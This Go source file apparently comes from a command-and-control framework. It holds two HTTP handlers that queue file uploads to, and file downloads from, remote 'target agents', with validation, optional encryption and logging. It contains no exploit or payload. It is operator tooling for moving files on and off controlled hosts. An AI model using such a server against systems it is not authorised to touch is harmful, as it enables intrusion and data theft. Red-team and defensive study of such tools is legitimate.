package api

import (
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// UploadToAgent queues a file upload command to a target agent
func (h *Handlers) UploadToAgent(c *gin.Context) {
	agentID := c.Param("id")

	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	const maxSize = 100 * 1024 * 1024
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxSize)

	file, err := c.FormFile("file")
	if err != nil {
		if err.Error() == "http: request body too large" {
			c.Status(http.StatusRequestEntityTooLarge)
			h.APIResponse(c, false, "", nil, "File too large (max 100MB)")
			return
		}
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "File not provided: "+err.Error())
		return
	}
	if file.Size > maxSize {
		c.Status(http.StatusRequestEntityTooLarge)
		h.APIResponse(c, false, "", nil, "File too large (max 100MB)")
		return
	}

	if err := validateFileName(file.Filename); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid filename: %v", err))
		return
	}
	if !isAllowedFileExtension(file.Filename) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "File extension not allowed")
		return
	}

	dst := c.PostForm("destination_path")
	if dst == "" {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Destination path required")
		return
	}
	if err := validateFilePath(dst); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid destination path: %v", err))
		return
	}

	src, err := file.Open()
	if err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to open file")
		return
	}
	defer src.Close()

	content, err := io.ReadAll(src)
	if err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to read file")
		return
	}

	if err := validateFileContent(content, file.Filename); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid file content: %v", err))
		return
	}

	var payload []byte
	isEncrypted := false

	if h.server.CryptoMgr != nil {
		enc, err := h.server.CryptoMgr.EncryptData(content)
		if err != nil {
			c.Status(http.StatusInternalServerError)
			h.APIResponse(c, false, "", nil, "Failed to encrypt file")
			return
		}
		payload = []byte(enc)
		isEncrypted = true
	} else {
		payload = content
	}

	cmd := &types.Command{
		ID:              generateSecureUUID(),
		AgentID:         agentID,
		Command:         "internal_upload",
		OperationType:   "upload",
		DestinationPath: dst,
		FileContent:     payload,
		IsEncrypted:     isEncrypted,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300,
		Metadata: map[string]string{
			"original_filename": file.Filename,
			"file_size":         fmt.Sprintf("%d", len(content)),
			"uploaded_by_ip":    c.ClientIP(),
		},
	}

	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to queue upload")
		return
	}

	h.server.Logger.LogFileTransfer(agentID, "upload", file.Filename, fmt.Sprintf("%d", len(content)), true)

	h.APIResponse(c, true, "Upload queued", map[string]interface{}{
		"command_id":  cmd.ID,
		"status":      cmd.Status,
		"filename":    file.Filename,
		"file_size":   len(content),
		"destination": dst,
		"encrypted":   isEncrypted,
	}, "")
}

// DownloadFromAgent queues a file download command from a target agent
func (h *Handlers) DownloadFromAgent(c *gin.Context) {
	agentID := c.Param("id")

	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	var req struct {
		SourcePath      string `json:"source_path"      binding:"required"`
		DestinationPath string `json:"destination_path"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid request: "+err.Error())
		return
	}

	if err := validateFilePath(req.SourcePath); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid source path: %v", err))
		return
	}
	if req.DestinationPath != "" {
		if err := validateFilePath(req.DestinationPath); err != nil {
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid destination path: %v", err))
			return
		}
	}
	if !isAllowedFileExtension(req.SourcePath) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "File extension not allowed for download")
		return
	}

	cmd := &types.Command{
		ID:              generateSecureUUID(),
		AgentID:         agentID,
		Command:         "internal_download",
		OperationType:   "download",
		SourcePath:      req.SourcePath,
		DestinationPath: req.DestinationPath,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300,
		Metadata: map[string]string{
			"requested_by_ip": c.ClientIP(),
		},
	}

	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to queue download")
		return
	}

	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("DOWNLOAD %s", req.SourcePath), "Queued", true)

	h.APIResponse(c, true, "Download queued", map[string]interface{}{
		"command_id":  cmd.ID,
		"status":      cmd.Status,
		"source":      req.SourcePath,
		"destination": req.DestinationPath,
	}, "")
}
